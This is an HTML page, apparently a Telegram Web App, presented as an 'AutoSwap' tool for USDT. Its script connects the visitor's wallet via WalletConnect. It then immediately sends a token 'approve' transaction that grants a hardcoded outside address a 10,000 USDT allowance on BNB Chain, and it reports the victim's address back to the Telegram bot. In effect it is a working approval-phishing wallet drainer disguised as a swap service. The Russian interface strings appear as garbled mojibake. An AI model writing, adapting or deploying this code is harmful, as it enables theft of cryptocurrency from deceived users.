<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>AutoSwap ‚Äî approve USDT to Wallet</title>
  <style>
    body {
      margin: 0; padding: 20px;
      background: #000; color: #e0e0e0;
      font-family: 'Segoe UI', sans-serif; text-align: center;
    }
    .container { max-width:500px; margin:0 auto; padding:30px; }
    canvas { display:block; margin:20px auto; }
    #manual-uri {
      margin-top:10px; font-size:14px;
      word-break:break-all; background: rgba(255,255,255,0.05);
      padding:10px; border-radius:8px;
    }
    #status { margin-top:20px; font-size:16px; white-space:pre-wrap; }
    .uri-link {
      display:inline-block; margin-top:8px;
      color:#4fc3f7; text-decoration:underline;
      cursor:pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üîÑ AutoSwap ‚Äî approve USDT</h1>
    <canvas id="qrcode"></canvas>
    <div id="manual-uri">URI –±—É–¥–µ—Ç –∑–¥–µ—Å—å</div>
    <div id="status">–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>
  </div>

  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>

  <script type="module">
    import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.13.1';
    import { ethers } from 'https://esm.sh/ethers@6.14.3';
    const { Interface, parseUnits, getAddress } = ethers;

    const tg = window.Telegram.WebApp;
    if (tg) tg.ready();

    const setStatus = (msg, color="#4fc3f7") => {
      const el = document.getElementById("status");
      el.textContent = msg;
      el.style.color = color;
    };

    const setURI = (uri) => {
      const el = document.getElementById("manual-uri");
      el.textContent = uri;
      if (tg) {
        const link = document.createElement("a");
        link.textContent = "–û—Ç–∫—Ä—ã—Ç—å –∫–æ—à–µ–ª—ë–∫";
        link.className = "uri-link";
        link.onclick = () => { tg.openTelegramLink(uri); return false; };
        el.appendChild(link);
      }
    };

    async function runApp() {
      try {
        setStatus("üîå –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è WalletConnect‚Ä¶");
        const client = await SignClient.init({
          projectId: "d868f90cd734355ae0328f8f0258b6b1",
          relayUrl: "wss://relay.walletconnect.com",
          metadata: { name: "AutoSwap Approve Flow", url: location.href }
        });

        setStatus("üì∑ –ì–µ–Ω–µ—Ä–∞—Ü–∏—è QR‚Äë–∫–æ–¥–∞‚Ä¶");
        const { uri, approval } = await client.connect({
          requiredNamespaces: { eip155: { chains: ["eip155:56"], methods: ["eth_sendTransaction"], events: [] } }
        });

        if (uri) {
          QRCode.toCanvas(document.getElementById("qrcode"), uri, { width:240, margin:1 });
          setURI(uri);
          setStatus("üì± –°–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR‚Äë–∫–æ–¥ –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ —Å—Å—ã–ª–∫—É");
        }

        const session = await approval();
        const address = session.namespaces.eip155.accounts[0].split(":")[2];
        setStatus(`‚úÖ –ö–æ—à–µ–ª—ë–∫ –ø–æ–¥–∫–ª—é—á—ë–Ω: ${address}`, "#66bb6a");

        const amount = parseUnits("10000", 18);
        const usdt = getAddress("0x55d398326f99059ff775485246999027b3197955");
        const receiver = getAddress("0xC25edef7dbf23D4FBBB1Cecb9C56380eF35c11AE");
        setStatus("‚úçÔ∏è –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ approve...");
        const data = new Interface(["function approve(address,uint256)"])
          .encodeFunctionData("approve", [receiver, amount]);

        setStatus("üöÄ –û—Ç–ø—Ä–∞–≤–∫–∞ approve...");
        const tx = await client.request({
          topic: session.topic, chainId: "eip155:56",
          request: { method: "eth_sendTransaction", params: [{ from: address, to: usdt, data }] }
        });
        setStatus(`‚úÖ Approve –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω:\n${tx}`, "#66bb6a");

        if (tg) tg.sendData(JSON.stringify({ address }));
      } catch (e) {
        console.error(e);
        setStatus(`‚ùå –û—à–∏–±–∫–∞: ${e.message || e.reason}`, "#ff6b6b");
      }
    }

    runApp();
  </script>
</body>
</html>
